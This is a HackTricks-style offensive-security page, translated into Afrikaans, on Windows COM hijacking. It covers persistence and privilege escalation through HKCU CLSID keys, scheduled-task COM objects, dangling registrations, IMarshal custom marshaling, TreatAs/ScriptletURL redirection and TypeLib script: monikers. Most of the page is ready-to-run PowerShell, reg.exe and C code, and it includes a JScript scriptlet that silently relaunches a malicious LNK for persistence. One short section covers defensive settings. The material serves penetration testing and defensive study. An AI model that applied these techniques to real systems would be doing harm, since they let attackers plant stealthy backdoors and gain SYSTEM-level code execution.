# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Soek na nie-bestaande COM-komponente

Omdat gebruikers die waardes van HKCU kan wysig, kan **COM Hijacking** as ’n **volhardingsmeganisme** gebruik word. Met `procmon` is dit maklik om na COM-registersleutels te soek wat nie bestaan nie, maar deur ’n aanvaller geskep kan word. Klassieke filters:

- **RegOpenKey**-bewerkings.
- waar die _Result_ **NAME NOT FOUND** is.
- en die _Path_ eindig met **InprocServer32**.

Nuttige variasies tydens soektogte:

- Soek ook na ontbrekende **`LocalServer32`**-sleutels. Sommige COM-klasse is buite-proses-bedieners en sal ’n EXE wat deur ’n aanvaller beheer word, in plaas van ’n DLL begin.
- Soek na **`TreatAs`**- en **`ScriptletURL`**-registerbewerkings, benewens `InprocServer32`. Onlangse opsporingsinhoud en wanwarebeskrywings noem dit telkens omdat hulle baie skaarser as gewone COM-registrasies is en dus ’n sterk sein is.
- Kopieer die wettige **`ThreadingModel`** vanaf die oorspronklike `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` wanneer jy ’n registrasie na HKCU kloon. Die verkeerde model veroorsaak dikwels dat aktivering misluk en maak die hijacking opvallend.<sup>[[3]](#references)</sup>
- Op 64-bis-stelsels, ondersoek beide die 64-bis- en 32-bis-aansigte (`procmon.exe` teenoor `procmon64.exe`, `HKLM\Software\Classes` en `HKLM\Software\Classes\WOW6432Node`), want 32-bis-toepassings kan ’n ander COM-registrasie oplos.

Sodra jy besluit het watter nie-bestaande COM jy wil naboots, voer die volgende opdragte uit. _Wees versigtig as jy besluit om ’n COM na te boots wat elke paar sekondes gelaai word, want dit kan oordrewe wees._

```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

### Kaapbare Taakskeduleerder-COM-komponente

Windows-take gebruik Custom Triggers om COM-objects aan te roep, en omdat hulle deur die Taakskeduleerder uitgevoer word, is dit makliker om te voorspel wanneer hulle geaktiveer gaan word.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      $usersSid = "S-1-5-32-545"
      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

      if ($Task.Principal.GroupId -eq $usersGroup)
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Deur die uitvoer na te gaan, kan jy byvoorbeeld een kies wat **elke keer wanneer ’n gebruiker aanmeld** uitgevoer gaan word.

As jy nou vir die CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** in **HKEY\CLASSES\ROOT\CLSID** en in HKLM en HKCU soek, sal jy gewoonlik vind dat die waarde nie in HKCU bestaan nie.

```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
               ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```

Dan kan jy eenvoudig die HKCU-inskrywing skep, en elke keer wanneer die gebruiker aanmeld, sal jou backdoor uitgevoer word.

## Dangling COM-registrasies en pasgemaakte marshaling

’n COM-registrasie wat masjienwyd geld, kan ’n DLL-planting-primitief word sonder dat die register verander word. Soek na ’n `InprocServer32`-waarde waarvan die DLL ontbreek en waarvan die finale pad deur ’n gebruiker met lae voorregte geskep of gewysig kan word. Deur ’n DLL met presies dieselfde naam te plant, kan enige proses wat die CLSID aktiveer, aanvallerkode laai. In die CrossDevice-voorbeeld was die geregistreerde pad `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll`, dus kon ’n standaardgebruiker die ontbrekende subgids en DLL skep.<sup>[[5]](#references)</sup>

### Skryfbare plugin-toewysings as bevoorregte COM-aktiveringspaaie

’n Skryfbare plugin-ID-na-CLSID-toewysing kan ’n gebruiker met minder voorregte laat kies watter in-proses COM-bediener ’n bevoorregte diens laai, selfs wanneer die masjienwye registrasie van die klas nie gewysig kan word nie.<sup>[[8]](#references)[[9]](#references)</sup> In die gerapporteerde Windows 11 `InstallService`-geval kon standaardgebruikers `StaticPluginMap` wysig; ’n nie-ingeboude plugin-ID het ’n CLSID gekies wat die `LocalSystem`-diens aan `CoCreateInstance` met `CLSCTX_INPROC_SERVER` en `IID_IInstallServicePlugin` deurgegee het.<sup>[[8]](#references)[[9]](#references)</sup> Die geregistreerde DLL laai in die diensproses, eerder as in ’n aparte COM-gasheer.<sup>[[10]](#references)</sup>

Die relevante voorwaardes is effektiewe skryftoegang tot die toewysing, ’n bereikbare plugin-versoek en ’n `InprocServer32`-DLL-pad wat die gebruiker met minder voorregte kan beheer.<sup>[[8]](#references)[[9]](#references)</sup> Die CrossDevice-registrasie hier bo het in die gerapporteerde geval aan die padvoorwaarde voldoen.<sup>[[8]](#references)[[9]](#references)</sup> ’n Suksesvolle plugin-objek moet die aangevraagde koppelvlak blootstel, maar die DLL word gelaai voordat `CoCreateInstance` voltooi; die versuim om daardie koppelvlak bloot te stel, sluit kode-uitvoering tydens die laai op sigself nie uit nie.<sup>[[8]](#references)[[11]](#references)</sup> Hierdie diensversendingsroete verskil van die pasgemaakte `IMarshal`-roete hier onder. Sien [DLL Hijacking](dll-hijacking/) vir die afsonderlike lêerpadprimitief.

### `IMarshal` as ’n DLL-laaiprimotief tussen prosesse

COM stel ’n koppelvlakwyser gewoonlik voor met ’n standaard-`OBJREF` wat die ontvanger na die oorspronklike objek verwys. ’n Objek wat `IMarshal` implementeer, kan eerder ’n pasgemaakte `OBJREF` produseer. Sy `GetUnmarshalClass`-metode verskaf die CLSID van die kode wat die objek in die ontvangende proses sal herkonstrueer. Daardie CLSID hoef nie die oorspronklike objek te identifiseer nie. COM los dit as ’n in-proses bediener op en laai die geregistreerde DLL voordat die aangevraagde koppelvlakmetode aangeroep word.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

’n Minimale kwaadwillige implementering hoef slegs die dangling CLSID in `GetUnmarshalClass` te vervang.<sup>[[5]](#references)</sup>

```c
HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
    REFIID riid, void *pv, DWORD dest_context,
    void *dest_context_ptr, DWORD flags, CLSID *clsid) override
{
    return CLSIDFromString(L"{DANGLING-CLSID}", clsid);
}
```

Stuur hierdie objek deur ’n geproxiede metodeparameter soos ’n `[in] IUnknown *`. Nog ’n opsie is `CoGetInstanceFromIStorage`, waar die objek met custom marshaling ook genoeg van `IStorage` implementeer om die plaaslike kontroles te slaag. Outomatiese unmarshaling in die afgeleë bediener los die vervangde CLSID op, dus word die DLL gelaai voordat die teikenmetode loop.<sup>[[5]](#references)</sup>

Die primitive is nie beperk tot ontbrekende registrasies nie. Dit kan die ontvanger ook dwing om ’n bestaande custom-unmarshaler-DLL te laai en foute in die laai- of unmarshaling-pad daarvan blootlê.<sup>[[5]](#references)</sup>

Die ketting vereis al die volgende voorwaardes:<sup>[[5]](#references)</sup>

1. ’n Masjien-sigbare CLSID wys na ’n ontbrekende of vervangbare in-process DLL.
2. Die aanvaller kan daardie DLL by die opgeloste pad plaas.
3. ’n Aktiveerbare out-of-process COM-bediener loop met die verlangde privilegiëvlak.
4. Die bediener aanvaar custom marshaling en stel ’n geproxiede oproep bloot wat die aanvaller se objek oor die prosesgrens stuur.

### Vind losstaande in-process-bedieners

[OleViewDotNet](https://github.com/tyranid/oleviewdotnet) en [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) kan die masjien se COM-databasis opsom en elke bediener deur normale Win32-moduleoplossing toets. Dit is beter as `Test-Path`, omdat sommige registrasies slegs ’n lêernaam bevat en op die loader se soekpad staatmaak.<sup>[[5]](#references)</sup>

```powershell
function Test-ComServer($Server) {
    try {
        Use-NtObject ($lib = Import-Win32Module -Path $Server -Flags AsDataFile) { $true }
    } catch { $false }
}

$db = Get-ComDatabase -LoadMode MachineOnly
$classes = Get-ComClass -Database $db -ServerType InProcServer32
$classes | Where-Object { -not (Test-ComServer $_.DefaultServer) } |
    Sort-Object DefaultServer | Select-Object Name, DefaultServer
```

Behandel die resultaat as ’n kandidaatlys, nie as bewys van uitbuitbaarheid nie. Los die pad op soos die loader dit doen, en ondersoek dan die DACL op die eerste bestaande ouergids en op die beoogde DLL as dit reeds bestaan. ’n Ontbrekende lêer is slegs nuttig as die aanvaller die pad wat COM werklik sal oplos, kan skep of vervang.<sup>[[5]](#references)</sup>

### Kies en begin ’n bevoorregte ontvanger

Ondersoek kandidaat-COM-klasse vir `RunAs`, diensassosiasie, beskikbare koppelvlakke en RPC-proxies. ’n Klas wat vir `SYSTEM` opgestel is, maar nie deur ’n benoemde diens ondersteun word nie, kan dalk nie direk geaktiveer word nie, omdat RPCSS dit nie kan begin nie. Soek in daardie geval na ’n onbevoorregte sneller wat sy gasheer begin, soos ’n uitvoerbare geskeduleerde taak, en herhaal enige benoemde gebeurtenis- of IPC-voorvereiste wat die bediener aan die gang hou.<sup>[[5]](#references)</sup>

Die kwesbare Shell Create Object Handler-ketting het byvoorbeeld sy gasheer begin deur die verwagte globale gebeurtenis te skep voordat ’n geskeduleerde taak wat deur ’n gebruiker uitgevoer kon word, aangeroep is.<sup>[[5]](#references)</sup>

```powershell
$ev = New-NtEvent -Win32Path 'Global\ShellCreateObjectTaskReadyEvent' -InitialState $false
Start-ScheduledTask -TaskPath '\Microsoft\Windows\Shell\' -TaskName 'CreateObjectTask'
$ev.Wait()
$object = New-ComObject -Clsid '135fd325-45b7-4c30-89f8-4386961669f0'
```

Karteer die resulterende objekverwysing terug na sy gasheer en verifieer beide identiteit en marshaling-beleid. Lys daarna die interfaces en skakel hul proxies om na IDL om ’n invoerparameter soos `IUnknown *` te vind wat die fake object sal marshal.<sup>[[5]](#references)</sup>

```powershell
$objref = Get-ComObjRef -Object $object
Get-ComProcess -ProcessId $objref.ProcessId |
    Select-Object Name, User, CustomMarshalAllowed

Get-ComInterface -Object $object
Get-ComInterface -Name '<interface>' | ConvertTo-ComSourceCode -Parse
```

### Beskerming teen custom marshaling

’n Geskikte ontvanger moet nie onbetroubare custom marshalers verwerp nie. Twee proseswye beskermings is `EOAC_NO_CUSTOM_MARSHAL` in die capabilities wat aan `CoInitializeSecurity` deurgegee word, en `COMGLB_UNMARSHALING_POLICY_STRONG` wat via `IGlobalOptions::Set` gestel word. Met symbols kan die ooreenstemmende toestand nagegaan word in `combase!gCapabilities` en `combase!g_GLBOPT_UnmarshalingPolicy`; NtObjectManager stel die resultaat bloot as `CustomMarshalAllowed` waar sy prosesparser die Windows-build ondersteun.<sup>[[5]](#references)</sup>

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` laat een CLSID toe om deur ’n ander nageboots te word.<sup>[[4]](#references)</sup> Vanuit ’n offensiewe perspektief beteken dit dat jy die oorspronklike CLSID onaangeraak kan laat, ’n tweede CLSID per gebruiker kan skep wat na `scrobj.dll` wys, en dan die regte COM-objek na die kwaadwillige een kan herlei met `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Dit is nuttig wanneer:

- die teikentoepassing reeds ’n stabiele CLSID by aanmelding of wanneer die toepassing begin, instansieer
- jy ’n register-herleiding wil hê in plaas daarvan om die oorspronklike `InprocServer32` te vervang
- jy ’n plaaslike of afgeleë `.sct`-scriptlet deur die `ScriptletURL`-waarde wil uitvoer

Voorbeeldwerkvloei (aangepas uit openbare Atomic Red Team-tegnieke en ouer navorsing oor COM-registermisbruik):

```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```

Notes:

- `scrobj.dll` lees die `ScriptletURL`-waarde en voer die verwysde `.sct` uit, dus kan jy die payload as ’n plaaslike lêer hou of dit op afstand via HTTP/HTTPS ophaal.
- `TreatAs` is besonder nuttig wanneer die oorspronklike COM-registrasie in HKLM volledig en stabiel is, omdat jy net ’n klein herleiding per gebruiker nodig het in plaas daarvan om die hele boom te weerspieël.
- Vir validering sonder om vir die natuurlike sneller te wag, kan jy die vals ProgID/CLSID handmatig instansieer met `rundll32.exe -sta <ProgID-or-CLSID>` as die teikenklas STA-aktivering ondersteun.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) definieer COM-koppelvlakke en word via `LoadTypeLib()` gelaai. Wanneer ’n COM-bediener geïnstansieer word, kan die bedryfstelsel ook die geassosieerde TypeLib laai deur die registersleutels onder `HKCR\TypeLib\{LIBID}` te raadpleeg. As die TypeLib-pad met ’n **moniker** vervang word, bv. `script:C:\...\evil.sct`, sal Windows die scriptlet uitvoer wanneer die TypeLib opgelos word – wat ’n sluipende persistence oplewer wat aktiveer wanneer algemene komponente gebruik word.

Dit is waargeneem teen die Microsoft Web Browser-beheer (wat gereeld deur Internet Explorer, toepassings wat WebBrowser insluit, en selfs `explorer.exe` gelaai word).<sup>[[1]](#references)[[2]](#references)</sup>

### Stappe (PowerShell)

1) Identifiseer die TypeLib (LIBID) wat deur ’n hoëfrekwensie-CLSID gebruik word. Voorbeeld van ’n CLSID wat dikwels deur malware-kettings misbruik word: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).

```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```

2) Wys die per-gebruiker TypeLib-pad na ’n plaaslike scriptlet met die `script:`-moniker (geen adminregte word vereis nie):

```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```

3) Plaas ’n minimale JScript `.sct` wat jou primêre payload herbegin (bv. ’n `.lnk` wat in die aanvanklike ketting gebruik word):

```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
  <script language="JScript">
    <![CDATA[
      try {
        var sh = new ActiveXObject('WScript.Shell');
        // Re-launch the malicious LNK for persistence
        var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
        sh.Run(cmd, 0, false);
      } catch(e) {}
    ]]>
  </script>
</scriptlet>
```

4) Aktivering – deur IE, ’n toepassing wat die WebBrowser-beheer insluit, of selfs gewone Explorer-aktiwiteit oop te maak, word die TypeLib gelaai en die scriptlet uitgevoer, wat jou ketting weer aktiveer wanneer jy aanmeld of herbegin.

Opruiming
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```

Notas
- Jy kan dieselfde logika op ander COM-komponente met hoë gebruiksfrekwensie toepas; bepaal altyd eers die werklike `LIBID` vanaf `HKCR\CLSID\{CLSID}\TypeLib`.
- Op 64-bis-stelsels kan jy ook die `win64`-subsleutel vir 64-bis-verbruikers invul.

## References

- [1] [Kaping van die TypeLib – Nuwe COM-volhardingstegniek (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – ZipLine-veldtog: ’n Gesofistikeerde uitvissingaanval wat Amerikaanse maatskappye teiken](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [’n Nuwe ondersoek na COM-kaping (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [CLSID-sleutel (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
- [5] [Project Zero - Windows-uitbuitingstegnieke: Losstaande COM-objekregistrasies](https://projectzero.google/2026/09/windows-dangling-com.html)
- [6] [Microsoft Learn - IMarshal-koppelvlak](https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal)
- [7] [Microsoft Open Specifications - MS-DCOM OBJREF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31)
- [8] [Dark Elevator PoC en tegniese uiteensetting (califio)](https://github.com/califio/publications/tree/main/MADBugs/windows-CVE-2026-50343)
- [9] [Dark Elevator: Plaaslike regte-eskalasie via die Windows Install-diens (calif.io)](https://blog.calif.io/p/dark-elevator-windows-install-service)
- [10] [CLSCTX-opsomming (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/wtypesbase/ne-wtypesbase-clsctx)
- [11] [CoCreateInstance-funksie (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance)
{{#include ../../banners/hacktricks-training.md}}

